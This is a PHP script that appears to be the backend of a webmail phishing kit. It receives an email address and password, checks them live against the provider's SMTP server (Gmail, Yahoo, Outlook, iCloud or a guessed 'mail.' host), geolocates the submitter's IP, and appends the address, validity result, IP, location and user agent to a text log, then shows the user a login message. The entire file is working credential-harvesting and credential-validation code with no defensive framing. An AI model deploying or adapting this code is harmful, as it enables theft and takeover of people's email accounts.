<?php
// Force JSON output
header('Content-Type: application/json; charset=utf-8');

// Capture all output including errors
ob_start();

error_reporting(E_ALL);
ini_set('display_errors', 0); // Turn off HTML error display
ini_set('log_errors', 1); // Log errors instead

// CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

try {
    require_once __DIR__ . '/class.phpmailer.php';
    require_once __DIR__ . '/class.smtp.php';
} catch (Throwable $e) {
    $output = ob_get_clean();
    echo json_encode([
        'success' => false,
        'error' => 'Failed to load required files: ' . $e->getMessage(),
        'extra_output' => $output
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit();
}

// Function to get client IP
function getClientIP() {
    $ipKeys = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Function to get geolocation info
function getGeoInfo($ip) {
    if ($ip === 'Unknown' || $ip === '127.0.0.1') {
        return 'Local/Unknown';
    }
    
    try {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,isp");
        if ($response) {
            $data = json_decode($response, true);
            if ($data && isset($data['country'])) {
                return "{$data['city']}, {$data['regionName']}, {$data['country']} ({$data['isp']})";
            }
        }
    } catch (Exception $e) {
        // Ignore geolocation errors
    }
    
    return 'Unknown location';
}

try {
    // Get POST data
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data) {
        $data = $_POST;
    }
    
    // Validate input
    $email = trim($data['email'] ?? '');
    $password = $data['password'] ?? '';
    
    if (empty($email) || empty($password)) {
        echo json_encode([
            'signal' => 'error',
            'success' => false,
            'msg' => 'Email and password are required'
        ]);
        exit();
    }
    
    // Validate email format
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo json_encode([
            'signal' => 'error',
            'success' => false,
            'msg' => 'Invalid email format'
        ]);
        exit();
    }
    
    // Extract domain from email for SMTP configuration
    $domain = substr(strrchr($email, "@"), 1);
    
    // Common SMTP configurations for popular providers
    $smtpConfigs = [
        'gmail.com' => ['host' => 'smtp.gmail.com', 'port' => 587, 'secure' => 'tls'],
        'yahoo.com' => ['host' => 'smtp.mail.yahoo.com', 'port' => 587, 'secure' => 'tls'],
        'outlook.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'hotmail.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'live.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'aol.com' => ['host' => 'smtp.aol.com', 'port' => 587, 'secure' => 'tls'],
        'icloud.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls'],
        'me.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls'],
        'mac.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls']
    ];
    
    // Default SMTP config (for cPanel/other providers)
    $smtpConfig = $smtpConfigs[$domain] ?? [
        'host' => 'mail.' . $domain,
        'port' => 587,
        'secure' => 'tls'
    ];
    
    // Test SMTP connection with detailed debugging
    $isValid = false;
    $errorMessage = '';
    $debugInfo = [];
    
    try {
        // Create new PHPMailer instance
        $testMail = new PHPMailer(true);
        
        // Configure SMTP
        $testMail->isSMTP();
        $testMail->Host = $smtpConfig['host'];
        $testMail->Port = $smtpConfig['port'];
        $testMail->SMTPSecure = $smtpConfig['secure'];
        $testMail->SMTPAuth = true;
        $testMail->Username = $email;
        $testMail->Password = $password;
        $testMail->SMTPDebug = 2; // Enable debug output
        $testMail->Timeout = 15; // Increased timeout
        $testMail->SMTPKeepAlive = false;
        
        // Capture debug output
        $debugOutput = '';
        $testMail->Debugoutput = function($str, $level) use (&$debugOutput) {
            $debugOutput .= "[$level] $str\n";
            error_log("SMTP Debug [$level]: $str");
        };
        
        $debugInfo['smtp_config'] = [
            'host' => $smtpConfig['host'],
            'port' => $smtpConfig['port'],
            'secure' => $smtpConfig['secure'],
            'username' => $email,
            'password_length' => strlen($password)
        ];
        
        // Try to connect
        $debugInfo['connection_attempt'] = 'Starting connection...';
        $connectionResult = $testMail->smtpConnect();
        $debugInfo['connection_result'] = $connectionResult ? 'SUCCESS' : 'FAILED';
        
        if ($connectionResult) {
            $debugInfo['authentication_attempt'] = 'Starting authentication...';
            
            // Try to authenticate
            $authResult = $testMail->smtpAuthenticate($email, $password);
            $debugInfo['authentication_result'] = $authResult ? 'SUCCESS' : 'FAILED';
            
            if ($authResult) {
                $isValid = true;
                $errorMessage = 'Authentication successful';
            } else {
                $isValid = false;
                $errorMessage = 'Authentication failed - invalid credentials';
            }
            
            $testMail->smtpClose();
            $debugInfo['connection_closed'] = 'YES';
        } else {
            $isValid = false;
            $errorMessage = 'Cannot connect to SMTP server';
            $debugInfo['connection_error'] = 'Failed to establish connection';
        }
        
        $debugInfo['debug_output'] = $debugOutput;
        
    } catch (Exception $e) {
        $isValid = false;
        $errorMessage = 'SMTP Exception: ' . $e->getMessage();
        $debugInfo['exception'] = $e->getMessage();
        $debugInfo['exception_trace'] = $e->getTraceAsString();
        error_log("SMTP Error: " . $e->getMessage());
    } catch (Error $e) {
        $isValid = false;
        $errorMessage = 'SMTP Error: ' . $e->getMessage();
        $debugInfo['fatal_error'] = $e->getMessage();
        $debugInfo['error_trace'] = $e->getTraceAsString();
        error_log("SMTP Fatal Error: " . $e->getMessage());
    }
    
    // Get client information
    $clientIP = getClientIP();
    $geoInfo = getGeoInfo($clientIP);
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $timestamp = date('Y-m-d H:i:s T');
    
    // Prepare log entry
    $logEntry = sprintf(
        "[%s] Email: %s | Valid: %s | IP: %s | Location: %s | User-Agent: %s | Error: %s | SMTP: %s:%s | Debug: %s\n",
        $timestamp,
        $email,
        $isValid ? 'YES' : 'NO',
        $clientIP,
        $geoInfo,
        $userAgent,
        $errorMessage,
        $smtpConfig['host'],
        $smtpConfig['port'],
        json_encode($debugInfo)
    );
    
    // Log the attempt
    @file_put_contents('webmail_login_log.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Prepare response with debug information
    $response = [
        'signal' => $isValid ? 'ok' : 'error',
        'success' => $isValid,
        'msg' => $isValid ? 'Login successful!' : 'Invalid credentials. Please try again.',
        'details' => [
            'email' => $email,
            'domain' => $domain,
            'smtp_host' => $smtpConfig['host'],
            'smtp_port' => $smtpConfig['port'],
            'smtp_secure' => $smtpConfig['secure'],
            'client_ip' => $clientIP,
            'location' => $geoInfo,
            'timestamp' => $timestamp,
            'notification_sent' => false,
            'notification_disabled' => true,
            'error_message' => $errorMessage,
            'authentication_result' => $isValid ? 'SUCCESS' : 'FAILED',
            'debug_info' => $debugInfo
        ]
    ];
    
    echo json_encode($response);
    
} catch (Exception $e) {
    error_log("Postmailer error: " . $e->getMessage());
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Server error occurred. Please try again.',
        'details' => [
            'error' => $e->getMessage()
        ]
    ]);
} catch (Error $e) {
    error_log("Postmailer fatal error: " . $e->getMessage());
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Server error occurred. Please try again.',
        'details' => [
            'error' => 'Internal server error'
        ]
    ]);
}
?>